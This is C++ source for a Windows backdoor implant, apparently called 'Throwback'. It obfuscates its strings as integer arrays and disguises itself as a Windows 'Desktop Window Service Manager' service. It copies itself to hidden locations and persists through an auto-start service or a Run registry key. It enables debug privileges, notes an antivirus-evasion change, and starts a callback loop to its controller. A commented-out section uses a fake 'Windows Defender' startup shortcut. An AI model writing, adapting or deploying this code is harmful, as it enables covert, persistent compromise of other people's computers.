#include "stdafx.h"
#include <UrlMon.h>
#include <winhttp.h>
#include <Windows.h>
#include <ShellAPI.h>
#include <string>
#include <time.h>
#include "WinHttpClient.h"
#include <tlhelp32.h>
#include "Throwback.h"
#include "Base64_RC4.h"

using namespace std;


//SERVICE VARIABLES
SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 

//PATH OF PERM EXE
wchar_t DSTEXE[MAX_PATH];

//DEFAULT CALLBACK PERIODS
int SHORTTIMEOUT = 20; //IN SECONDS

#ifdef _DEBUG
int DEFAULTTIMEOUT = 5; //IN SECONDS
#else
int DEFAULTTIMEOUT = 3600; //IN SECONDS = 60 MINUTES
#endif

//ADMIN PRIVS
int adminPrivs; //1 = YES, 0 = NO

//OS TYPE
bool osType; // 0=2K, XP, 2K3 and 1=Vista, 7, 2K8
bool osArch; // 0=x86, 1=x64

//FUNCTION DECLARATIONS
int deleteService(wstring);
int deleteRunKey();

//Provides Windows desktop management capabilities. Disabling this service may cause issues with the Windows desktop environment. 
int SVCDESC[] = {1,35,62,39,56,53,52,34,113,6,56,63,53,62,38,34,113,53,52,34,58,37,62,33,113,60,48,63,48,54,52,60,52,63,37,113,50,48,33,48,51,56,61,56,37,56,52,34,127,113,21,56,34,48,51,61,56,63,54,113,37,57,56,34,113,34,52,35,39,56,50,52,113,60,48,40,113,50,48,36,34,52,113,56,34,34,36,52,34,113,38,56,37,57,113,37,57,52,113,6,56,63,53,62,38,34,113,53,52,34,58,37,62,33,113,52,63,39,56,35,62,63,60,52,63,37,127};

//dwmss.exe
int SVCEXE[] = {53,38,60,34,34,127,52,41,52};

//dwmss
int SVCID[] = {53,38,60,34,34};

//Desktop Window Service Manager
int SVCNAME[] = {21,52,34,58,37,62,33,113,6,56,63,53,62,38,113,2,52,35,39,56,50,52,113,28,48,63,48,54,52,35};


//CHECKS IF OUR SERVICE IS INSTALLED
int checkServiceStatus()
{
	int ret = 1;
	
	//QUERY FOR SERVICE TO SEE IF INSTALLED CORRECTLY
	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);

	if(scManager != NULL)
	{
		scService = OpenService(scManager, decryptString(SVCID, (sizeof(SVCID)/sizeof(int))).c_str(), SERVICE_QUERY_STATUS);
		
		if(scService != NULL) ret = 0; //SERVICE INSTALLED
		else ret = 1; //NO SERVICE

		CloseServiceHandle(scService); 

	}else ret = 1;
	
	CloseServiceHandle(scManager);

	return ret;
}


int UninstallTB()
{
	int retInt = 0;
	wchar_t *strExePath = new wchar_t[MAX_PATH + 1];
	memset(strExePath, 0, MAX_PATH + 1);
	deleteRunKey();

	//DELETE FILE ON NEXT REBOOT
	//BUT THIS ONLY DELETES THE FILE IF RUNNING AS SYSTEM
	GetModuleFileName(NULL, strExePath, MAX_PATH);
	MoveFileEx(strExePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	//IF WE'RE ADMIN AND THE SERVICE EXISTS, THEN DELETE IT
	if(checkServiceStatus() == 0 && adminPrivs == 1)
	{
		if(deleteService(decryptString(SVCID, (sizeof(SVCID)/sizeof(int)))) != 0) retInt = 1;
	}

	return retInt;
}


int installService()
{
	int retValue = 1;

	SC_HANDLE schSCManager;
    SC_HANDLE schService;
	wstring args;
	
    //GET A HANDLE TO THE SCM DB 
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if(schSCManager != NULL)
	{
		//ATTEMPT TO CREATE SERVICE
		schService = CreateService(schSCManager, decryptString(SVCID, (sizeof(SVCID)/sizeof(int))).c_str(), decryptString(SVCNAME, (sizeof(SVCNAME)/sizeof(int))).c_str(), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, DSTEXE, NULL, NULL, NULL, NULL, NULL);
		
		//IF INSTALL WAS SUCCESSFULL THEN SET THE DESCRIPTION IN REGISTRY
		if(schService != NULL)
		{
			retValue = 0;
			
			// SYSTEM\CurrentControlSet\Services\ 
			int serviceKeyCode[] = {2,8,2,5,20,28,13,18,36,35,35,52,63,37,18,62,63,37,35,62,61,2,52,37,13,2,52,35,39,56,50,52,34,13};
			wstring serviceKey = decryptString(serviceKeyCode, (sizeof(serviceKeyCode)/sizeof(int)));
			//APPEND THE SERVICE NAME
			serviceKey.append(decryptString(SVCID, (sizeof(SVCID)/sizeof(int))));

			HKEY hKey;
			hKey = regOpenKey(HKEY_LOCAL_MACHINE, serviceKey.c_str(), KEY_ALL_ACCESS);

			if(hKey != NULL)
			{
				// Indexes contents and properties of files on local and remote computers; provides rapid access to files through flexible querying language.
				//int serviceDescCode[] = {24,63,53,52,41,52,34,113,50,62,63,37,52,63,37,34,113,48,63,53,113,33,35,62,33,52,35,37,56,52,34,113,62,55,113,55,56,61,52,34,113,62,63,113,61,62,50,48,61,113,48,63,53,113,35,52,60,62,37,52,113,50,62,60,33,36,37,52,35,34,106,113,33,35,62,39,56,53,52,34,113,35,48,33,56,53,113,48,50,50,52,34,34,113,37,62,113,55,56,61,52,34,113,37,57,35,62,36,54,57,113,55,61,52,41,56,51,61,52,113,32,36,52,35,40,56,63,54,113,61,48,63,54,36,48,54,52,127};
				wstring serviceDesc = decryptString(SVCDESC, (sizeof(SVCDESC)/sizeof(int)));
				
				// Description
				int descCode[] = {21,52,34,50,35,56,33,37,56,62,63};
				
				if(RegSetValueEx(hKey, decryptString(descCode, (sizeof(descCode)/sizeof(int))).c_str(), 0, REG_SZ, (BYTE *)serviceDesc.c_str(), serviceDesc.size()+1) == ERROR_SUCCESS) retValue = 0;
				else retValue = 1;

			}retValue = 1;

			//CLOSE SERVICE HANDLE
			CloseServiceHandle(schService);

		}else retValue = 1;
	
		//CLOSE SCM DB HANDLE
		CloseServiceHandle(schSCManager);

	}else retValue = 1;

	return retValue;
}


int installRunKey()
{
	int retValue = 0;
	HKEY runKey;
	HKEY tmpKey;

	// Software\Microsoft\Windows\CurrentVersion\Run
	int subKeyCode[] = {2,62,55,37,38,48,35,52,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,13,18,36,35,35,52,63,37,7,52,35,34,56,62,63,13,3,36,63};
	wstring key = decryptString(subKeyCode, (sizeof(subKeyCode)/sizeof(int)));
	
	runKey = regOpenKey(HKEY_CURRENT_USER, key.c_str(), KEY_ALL_ACCESS);
	
	if(runKey == NULL) retValue = 1;
	else
	{
		int len = wcslen(DSTEXE) * 2;
		wstring value = decryptString(SVCNAME, (sizeof(SVCNAME)/sizeof(int)));

		//DON'T INSTALL PERSISTENCE IF IT'S ALREADY THERE
		//key.append(value.c_str());
		int keyCheck = RegQueryValueEx(runKey, value.c_str(), 0, 0, 0, 0);
		tmpKey = regOpenKey(HKEY_CURRENT_USER, key.c_str(), KEY_ALL_ACCESS);
		if(keyCheck != 0)
		{
			if(RegSetValueEx(runKey, value.c_str(), 0, REG_SZ, (BYTE *)DSTEXE, len + 1) == ERROR_SUCCESS)
			{
				//OutputDebugString(L"AUTORUN KEY PERSISTENCE INSTALLED!");
				retValue = 0;
			}
			else
			{
				DWORD t = GetLastError();
				//OutputDebugString(L"AUTORUN KEY PERSISTENCE FAILED!");
				retValue = 1;
			}
		}
		RegCloseKey(tmpKey);
	}

	RegCloseKey(runKey);
	return retValue;

	/**
	int retValue = 0;
	wstring installPath;

	//XP, 2K, OR 2K3
	if(osType == 0)
	{
		// \Start Menu\Programs\Startup\Windows Defender.url
		int osType1[] = {13,2,37,48,35,37,113,28,52,63,36,13,1,35,62,54,35,48,60,34,13,2,37,48,35,37,36,33,13,6,56,63,53,62,38,34,113,21,52,55,52,63,53,52,35,127,36,35,61};
		installPath = decryptString(osType1, (sizeof(osType1)/sizeof(int)));
	}
	//VISTA, 7, OR 2K8
	else
	{
		// \AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.url 
		int osType2[] = {13,16,33,33,21,48,37,48,13,3,62,48,60,56,63,54,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,13,2,37,48,35,37,113,28,52,63,36,13,1,35,62,54,35,48,60,34,13,2,37,48,35,37,36,33,13,6,56,63,53,62,38,34,113,21,52,55,52,63,53,52,35,127,36,35,61};
		installPath = decryptString(osType2, (sizeof(osType2)/sizeof(int)));
	}
	
	wchar_t shortcutPath[MAX_PATH] = L"";
	GetEnvironmentVariable(L"USERPROFILE", shortcutPath, MAX_PATH);
	wcscat(shortcutPath, installPath.c_str());

	//RETURN 1 IF ITS ALREADY INSTALLED
	if(GetFileAttributes(shortcutPath) != INVALID_FILE_ATTRIBUTES) retValue = 1;
	else
	{
		wchar_t exeImpersonator[MAX_PATH] = L"";
		GetEnvironmentVariable(L"SystemRoot", exeImpersonator, MAX_PATH);
		
		//USE THE ICON FOR TASKMGR.EXE
		// \\system32\\taskmgr.exe
		int exeImp[] = {13,13,34,40,34,37,52,60,98,99,13,13,37,48,34,58,60,54,35,127,52,41,52};
		wstring t = decryptString(exeImp, (sizeof(exeImp)/sizeof(int)));
		wcscat(exeImpersonator, t.c_str());

		//SHOULD RETURN 0 IF NO ERRORS
		retValue = WritePrivateProfileString(L"InternetShortcut", L"URL", DSTEXE, shortcutPath);
		retValue = WritePrivateProfileString(L"InternetShortcut", L"IconIndex", L"0", shortcutPath);
		retValue = WritePrivateProfileString(L"InternetShortcut", L"IconFile", exeImpersonator, shortcutPath); 
	}

	
	**/
}


int deleteRunKey()
{
	int retValue = 0;
	HKEY runKey;

	// Software\Microsoft\Windows\CurrentVersion\Run
	int subKeyCode[] = {2,62,55,37,38,48,35,52,13,28,56,50,35,62,34,62,55,37,13,6,56,63,53,62,38,34,13,18,36,35,35,52,63,37,7,52,35,34,56,62,63,13,3,36,63};
	wstring key = decryptString(subKeyCode, (sizeof(subKeyCode)/sizeof(int)));
	
	runKey = regOpenKey(HKEY_CURRENT_USER, key.c_str(), KEY_ALL_ACCESS);
	if(runKey == NULL) retValue = 1;
	else
	{
		wstring value = decryptString(SVCNAME, (sizeof(SVCNAME)/sizeof(int)));
		if(RegDeleteValue(runKey, value.c_str()) == ERROR_SUCCESS) 
		{
			//OutputDebugString(L"DELETED AUTORUN KEY");
			retValue = 0;
		}
		else
		{
			//OutputDebugString(L"FAILED TO DELETE AUTORUN KEY");
			retValue = 1;
		}
	}
	return retValue;

	/*
	//THE FOLLOWING SCRIPT WILL DELETE THE URL FILE FROM THE STARTUP FOLDER FOR ALL USERS
	// /c  del "c:\*windows defender.url" /s /q /f
	int deleteShortcut[] = {126,50,113,53,52,61,113,115,50,107,13,123,38,56,63,53,62,38,34,113,53,52,55,52,63,53,52,35,127,36,35,61,115,113,126,34,113,126,32,113,126,55};
	wstring arg = decryptString(deleteShortcut, (sizeof(deleteShortcut)/sizeof(int)));
	
	// cmd.exe
	int cmdCommand[] = {50,60,53,127,52,41,52};
	runCommand(decryptString(cmdCommand, (sizeof(cmdCommand)/sizeof(int))), arg, 0);
	arg.clear();
	
	return 0;
	**/
}


int deleteService(wstring serviceName) 
{
	//RETURNS 0 IF SUCCESS
	int retValue = 1;

	SC_HANDLE schSCManager;
    SC_HANDLE schService;
    
    //GET A HANDLE TO THE SCM DB 
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if(schSCManager != NULL)
	{
		schService = OpenService(schSCManager, serviceName.c_str(), DELETE);

		if(schService != NULL)
		{
			if(DeleteService(schService)) retValue = 0;
			else retValue = 1;
			
			//CLOSE SERVICE HANDLE
			CloseServiceHandle(schService); 

		}else retValue = 1;
	
	//CLOSE SCM DB HANDLE
    CloseServiceHandle(schSCManager);

	}else retValue = 1;

	return retValue;
}


void serviceInit()
{
	//REPORT STATUS TO SCM
	ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
	SetServiceStatus(hStatus, &ServiceStatus);
	
	//SEED THE RANDOM NUMBER GENERATOR
	srand(time(NULL));

	//SLEEP BEFORE FIRST CB...SERVICE MAY INITIALIZE BEFORE NETWORKING IS UP
	sleepDelay(SHORTTIMEOUT);
	sleepDelay(SHORTTIMEOUT);

	runLoop();

	return;
}


void WINAPI controlHandler(DWORD request)
{
	switch(request) 
	{ 
		case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
			SetServiceStatus(hStatus, &ServiceStatus);
			return; 
 
		case SERVICE_CONTROL_SHUTDOWN: 
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
			SetServiceStatus(hStatus, &ServiceStatus);
			return; 
        
		default:
			break;
	}
	return;
}


void WINAPI serviceMain()
{
	hStatus = RegisterServiceCtrlHandler(NULL, (LPHANDLER_FUNCTION)controlHandler); 
	
	if(!hStatus) 
	{ 
		//REGISTERING HANDLER FAILED
		return; 
	}
	
	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
	ServiceStatus.dwControlsAccepted =  SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode = 0; 
	ServiceStatus.dwServiceSpecificExitCode = 0; 
	ServiceStatus.dwCheckPoint = 0; 
	ServiceStatus.dwWaitHint = 0; 
	SetServiceStatus(hStatus, &ServiceStatus);

	//PERFORM SERVICE FUNCTIONS
	serviceInit();
	return; 
}


//COPY FILE TO PERMANENT LOCATION
int copyFile(wchar_t *sourceFile, wchar_t *destinationFile)
{
	//UNHIDE AND DELETE PRIOR TO NEW COPY
	SetFileAttributes(destinationFile, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(destinationFile);

	//AV FLAGGED HERE - USED CopyFile BEFORE!
	if(CopyFileEx(sourceFile, destinationFile, NULL, NULL, NULL, NULL) != 0) 
	{
		//HIDE FILE IF COPY WAS SUCCESSFUL
		SetFileAttributes(destinationFile, FILE_ATTRIBUTE_HIDDEN);
		
		//SUCCESSFUL COPY
		return 0;
	}
	//COPY FAILED
	return 1;
}


//CHECK INSTALL PATH
int checkPath()
{
	int count = 0;
	int ret = 0;	
	
	try
	{
		//BUILD PREFERRED EXE PATH
		wstring targetPath;
		wchar_t filePath[MAX_PATH] = L"";
		int strLen = GetEnvironmentVariable(L"CommonProgramFiles", filePath, MAX_PATH);
		// \services\ 
		int commonFileName[] = {13,34,52,35,39,56,50,52,34,13};
		targetPath = filePath;
		targetPath.append(decryptString(commonFileName, (sizeof(commonFileName)/sizeof(int))));
		targetPath.append(decryptString(SVCEXE, (sizeof(SVCEXE)/sizeof(int))));

		//PATH OF CURRENT EXE
		wchar_t tempFile[MAX_PATH];
		GetModuleFileName(NULL, tempFile, MAX_PATH);
		wstring currentPath = tempFile;
		
		if(currentPath.find(L"Common Files") != -1 || currentPath.find(L"common files") != -1 || currentPath.find(L"Common~1") != -1 || currentPath.find(L"common~1") != -1)
		{
			//ALREADY RUNNING FROM PREFERRED LOCATION
			wcscat(DSTEXE, currentPath.c_str());
			return 0;
		}
		else
		{
			if(copyFile((wchar_t *)currentPath.c_str(), (wchar_t *)targetPath.c_str()) == 0)
			{
				//COPY SUCCESSFUL TO PREFERRED LOCATION
				wcscat(DSTEXE, targetPath.c_str());
				return 1;
			}
			//COPY FAILED - USE SECONDARY LOCATION
			else
			{
				if(currentPath.find(L"Microsoft") != -1 || currentPath.find(L"Microsoft") != -1)
				{
					//ALREADY RUNNING FROM SECONDARY LOCATION
					wcscat(DSTEXE, currentPath.c_str());
					return 2;
				}
				else
				{
					//OutputDebugString(L"FAILED TO COPY TO PRIMARY LOCATION");
					//BUILD SECONDARY FILE LOCATION
					strLen = GetEnvironmentVariable(L"LOCALAPPDATA", filePath, MAX_PATH);
				
					// \Microsoft\ 
					int appFileName[] = {13,28,56,50,35,62,34,62,55,37,13};
					targetPath = filePath;
					targetPath.append(decryptString(appFileName, (sizeof(appFileName)/sizeof(int))));
					targetPath.append(decryptString(SVCEXE, (sizeof(SVCEXE)/sizeof(int))));

					if(copyFile((wchar_t *)currentPath.c_str(), (wchar_t *)targetPath.c_str()) == 0)
					{
						//COPY SUCCESSFUL TO SECONDARY LOCATION
						wcscat(DSTEXE, targetPath.c_str());
						return 3;
					}
					else
					{
						//WTF?
						wcscat(DSTEXE, currentPath.c_str());
						return 4;
					}
				}
			}
		}

			/**
			//UNHIDE AND DELETE PRIOR TO NEW COPY
			SetFileAttributes(targetPath.c_str(), FILE_ATTRIBUTE_NORMAL);
			DeleteFile(targetPath.c_str());

			//AV FLAGGED HERE - USED CopyFile BEFORE!
			ret = CopyFileEx(currentPath.c_str(), targetPath.c_str(), NULL, NULL, NULL, NULL); 
			
			//HIDE FILE IF COPY WAS SUCCESSFUL
			if(ret != 0) 
			{
				SetFileAttributes(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
				//SUCCESSFUL COPY TO PREFERRED LOCATION
				return 1;
			}
			else
			{
				if(currentPath.find(L"Identities") != -1 || currentPath.find(L"identities") != -1)
				{
					wcscat(DSTEXE, currentPath.c_str());
					//ALREADY RUNNING FROM SECONDARY LOCATION
					return 2;
				}
				else
				{
					//OutputDebugString(L"FAILED TO COPY TO PRIMARY LOCATION");

					//BUILD SECONDARY FILE LOCATION
					strLen = GetEnvironmentVariable(L"APPDATA", filePath, MAX_PATH);
				
					// \Identities\ 
					int appFileName[] = {13,24,53,52,63,37,56,37,56,52,34,13};
			
					targetPath = filePath;
					targetPath.append(decryptString(appFileName, (sizeof(appFileName)/sizeof(int)));
					targetPath.append(decryptString(SVCEXE, (sizeof(SVCEXE)/sizeof(int)));

					//UNHIDE AND DELETE PRIOR TO NEW COPY
					SetFileAttributes(targetPath.c_str(), FILE_ATTRIBUTE_NORMAL);
					DeleteFile(targetPath.c_str());

					//AV FLAGGED HERE - USED CopyFile BEFORE!
					ret = CopyFileEx(currentPath.c_str(), targetPath.c_str(), NULL, NULL, NULL, NULL); 
			
					//HIDE FILE IF COPY WAS SUCCESSFUL
					if(ret != 0) 
					{
						SetFileAttributes(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
						//SUCCESSFUL COPY TO PREFERRED LOCATION
						return 1;
					}
				}
			}

		}

		//OutputDebugString(L"CURRENTLY RUNNING FROM");
		//OutputDebugString(tempFile);

		if(wcscmp(tempFile, fullPath.c_str()) == 0)
		{
			ret = 0;//ALREADY RUNNING FOR PERM LOCATION
			//OutputDebugString(L"ALREADY RUNNING FROM PRIMARY LOCATION");
			//OutputDebugString(fullPath.c_str());
		}
		else
		{
			//OutputDebugString(L"ATTEMPING TO COPY TO PRIMARY LOCATION");

			//TRY TO COPY TO PREFERRED LOCATION
			ret = copyX(tempFile, fullPath.c_str());
			
			//ONLY TWO REASONS WHY COPY FAILS -- 1-FILE ALREADY RUNNING  2-PERMISSION ISSUE
			//UNABLE TO COPY FILE BECAUSE OF PERMISSIONS ISSUE
			if(ret != 0)
			{
				//OutputDebugString(L"FAILED TO COPY TO PRIMARY LOCATION");

				//BUILD SECONDARY FILE LOCATION
				wchar_t backupFilePath[MAX_PATH] = L"";
				strLen = GetEnvironmentVariable(L"APPDATA", backupFilePath, MAX_PATH);
				// \Microsoft\cisvc.exe
				int appFileName[] = {13,28,56,50,35,62,34,62,55,37,13,50,56,34,39,50,127,52,41,52}; 
			
				fullPath = backupFilePath;
				fullPath.append(decryptString(appFileName, (sizeof(appFileName)/sizeof(int)));

				if(wcscmp(backupFilePath, fullPath.c_str()) == 0)
				{
					//OutputDebugString(L"ALREADY RUNNING FROM SECONDARY LOCATION");
					ret = 1;//ALREADY RUNNING FROM BACKUP LOCATION
				}
				else
				{
					if(copyX(tempFile, fullPath.c_str()) == 0) ret = 3; //BACKUP WAS SUCCESSFUL, RETURN 3 
					else ret = 4; //BACKUP FAILED, RETURN 4
					//OutputDebugString(L"ATTEMPTING TO COPY TO SECONDARY LOCATION");
					//OutputDebugString(fullPath.c_str());
				}
			}else ret = 2; //PREFERRED WAS SUCCESSFUL, RETURN 2
		}
		**/
		//PUT PERM EXE PATH IN DSTEXE AS A GLOBAL
		//wcscat(DSTEXE, fullPath.c_str());
		
	}
	catch (...)
	{
		return 5; //NEEDED!!
	}

	return 0;
}


int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{

	//GUI STUFF THAT ISN'T USED//
	ShowWindow(CreateWindow(NULL, NULL, WS_DISABLED, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, NULL, NULL), SW_HIDE);
	
	//CHECK OS TYPE
	osType = checkOS();
	
	//OutputDebugString(L"CHECKING ARCH");

	//CHECK ARCHITECTURE
	osArch = checkArch();

	//OutputDebugString(L"CHECKING PRIVS");

	//CHECK PRIVILEGE LEVEL
	adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);

	//OutputDebugString(L"INITIALIZING VARS");

	//INITIALIZE GLOBAL VARIABLES
	int ret = initializeVars();

	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	//START WITH SERVICE STUFF
	wstring serviceName = decryptString(SVCNAME, (sizeof(SVCNAME)/sizeof(int)));
	
	//CREATE SERVICE TABLE ENTRIES
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = (wchar_t *)serviceName.c_str();
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)serviceMain;
	
	//START SERVICE CONTROL DISPATCHER
	StartServiceCtrlDispatcher(ServiceTable);  
	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	//SEED THE RANDOM NUMBER GENERATOR
	srand(time(0));

//DON'T INSTALL PERSISTENCE WHEN DEBUGGING
#ifndef _DEBUG

	//SLEEP FOR A BIT BEFORE DOING ANYTHING
	sleepDelay(16);

	//DELETE FILE IF PROVIDED AS COMMAND LINE ARGUMENT
	int numArgs = 0;
	LPWSTR *cmdLine = CommandLineToArgvW(GetCommandLineW(), &numArgs);
	if(numArgs > 1)
	{
		//OutputDebugString(L"FOUND ARGS");
		wstring dFile = cmdLine[1];
		
		//DELETE FILE IF IT EXISTS
		if(GetFileAttributes(dFile.c_str()) != INVALID_FILE_ATTRIBUTES)
		{
			SetFileAttributes(dFile.c_str(), FILE_ATTRIBUTE_NORMAL);
			DeleteFile(dFile.c_str());
		}
	}
	LocalFree(cmdLine);

	//OutputDebugString(L"CHECKING PATH");

	//SET EXE PATHS AND COPY EXE...IF NOT RUNNING FROM PERMANENT LOCATION
	//0=RUNNING FROM PREFERRED 1=RUNNING FROM BACKUP 2=COPY SUCCESSFUL TO PREFERRED 3=COPY SUCCESSFUL TO BACKUP 4=COPY FAILED TO BACKUP
	int newCopy = checkPath();

	if(adminPrivs == 1)
	{	
		//OutputDebugString(L"ADMIN PRIVS");

		if(numArgs < 2)
		{
			//DELETE EXISTING SERVICE IF RUNNING FOR THE FIRST TIME
			ret = deleteService(decryptString(SVCID, (sizeof(SVCID)/sizeof(int))));

			//NOW INSTALL OUR SERVICE
			ret = installService();
			//OutputDebugString(L"INSTALLED SERVICE");
		}

		//FUNCTION WILL DELETE THE LNK FROM THE STARTUP FOLDER FOR ALL USERS
		//NECESSARY FOR REMOVING LNK AFTER INSTALLING AS SYSTEM
		ret = deleteRunKey();
		
	}
	//IF NOT ADMIN INSTALL LNK PERSISTENCE
	else if(adminPrivs == 0)
	{
		//OutputDebugString(L"INSTALLING RUNKEY");

		//IF NOT INSTALLED, THEN INSTALL LNK PERSISTENCE!
		ret = installRunKey();
		
	}
	
	//START NEW LOCATION WITH COMMAND LINE ARG OF CURRENT LOCATION - USED TO DELETE CURRENT FILE
	//THIS IS NEEDED SO THE EXE CAN BE PLACED ANYWHERE ON DISK, COPY ITSELF TO PROPER LOCATION, AND THEN CLEAN UP THE OLD FILE
	if(newCopy == 1 || newCopy == 3)
	{
		//OutputDebugString(L"RESTARTING FROM PERM LOCATION");
		wchar_t tempFile[MAX_PATH];
		GetModuleFileName(NULL, tempFile, MAX_PATH);
		wstring tFileArgs = L" \""; 
		tFileArgs.append(tempFile);
		tFileArgs.append(L"\"");
		runCommand(DSTEXE, tFileArgs, 0);
		exit(0);
	}

	//IF WE'RE ADMIN, KICK OFF THE SERVICE AND EXIT
	if(adminPrivs == 1)
	{
		wstring fa = L"start ";
		fa.append(decryptString(SVCID, (sizeof(SVCID)/sizeof(int))));
		runCommand(L"net.exe", fa, 0);
		exit(0);
	}

#endif

	//START THE CALLBACK PROCESS
	runLoop();

	return 0;
}
